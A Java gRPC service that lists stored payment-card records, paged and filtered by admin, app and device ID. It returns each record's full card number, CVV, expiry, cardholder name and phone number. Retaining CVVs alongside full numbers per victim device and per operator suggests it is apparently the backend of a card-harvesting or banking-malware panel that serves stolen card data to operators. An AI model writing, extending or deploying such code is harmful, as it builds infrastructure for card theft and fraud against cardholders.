package app.service.grpc;

import app.service.grpc.cards.CardsServiceGrpc;
import app.service.grpc.cards.ListCardsRequest;
import app.service.grpc.cards.ListCardsResponse;
import app.service.grpc.cards.CardItem;
import app.service.model.CardRecord;
import app.service.store.CardQuery;
import app.service.store.CardsStore;
import io.grpc.stub.StreamObserver;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class CardsGrpcService extends CardsServiceGrpc.CardsServiceImplBase {

    private final CardsStore store;

    public CardsGrpcService(CardsStore store) {
        this.store = store;
    }

    @Override
    public void listCards(ListCardsRequest request, StreamObserver<ListCardsResponse> responseObserver) {
        try {
            CardQuery q = new CardQuery();
            q.setAdminId(request.getAdminId());
            q.setAppId(request.getAppId());
            if (!request.getDeviceId().isBlank()) q.setDeviceId(request.getDeviceId());
            if (!request.getQ().isBlank()) q.setQ(request.getQ());
            if (!request.getNetwork().isBlank()) q.setNetwork(request.getNetwork());
            q.setPage(Math.max(0, request.getPage()));
            q.setSize(Math.max(1, Math.min(200, request.getSize())));

            List<CardRecord> rows = store.list(q);
            int count = store.count(q);

            var builder = ListCardsResponse.newBuilder()
                    .setPage(q.getPage())
                    .setSize(q.getSize())
                    .setCount(count);
            for (CardRecord c : rows) builder.addItems(toProto(c));

            responseObserver.onNext(builder.build());
            responseObserver.onCompleted();
        } catch (Exception e) {
            responseObserver.onError(e);
        }
    }

    private CardItem toProto(CardRecord c) {
        CardItem.Builder b = CardItem.newBuilder()
                .setId(c.getId() == null ? 0 : c.getId())
                .setAdminId(nz(c.getAdminId()))
                .setDeviceId(nz(c.getDeviceId()))
                .setAppId(nz(c.getAppId()))
                .setExpiryMonth(c.getExpiryMonth() == null ? 0 : c.getExpiryMonth())
                .setExpiryYear(c.getExpiryYear() == null ? 0 : c.getExpiryYear())
                .setLuhnValid(c.isLuhnValid())
                .setEventTimestampMs(c.getEventTimestampMs() == null ? 0 : c.getEventTimestampMs());
        if (c.getBin() != null) b.setBin(c.getBin());
        if (c.getLast4() != null) b.setLast4(c.getLast4());
        if (c.getNetwork() != null) b.setNetwork(c.getNetwork());
        if (c.getProductType() != null) b.setProductType(c.getProductType());
        if (c.getIssuer() != null) b.setIssuer(c.getIssuer());
        if (c.getCountry() != null) b.setCountry(c.getCountry());
        if (c.getNameOnCard() != null) b.setNameOnCard(c.getNameOnCard());
        if (c.getPhoneNumber() != null) b.setPhoneNumber(c.getPhoneNumber());
        if (c.getCvv() != null) b.setCvv(c.getCvv());
        if (c.getPan() != null) b.setPan(c.getPan());
        return b.build();
    }

    private static String nz(String s) { return s == null ? "" : s; }
}
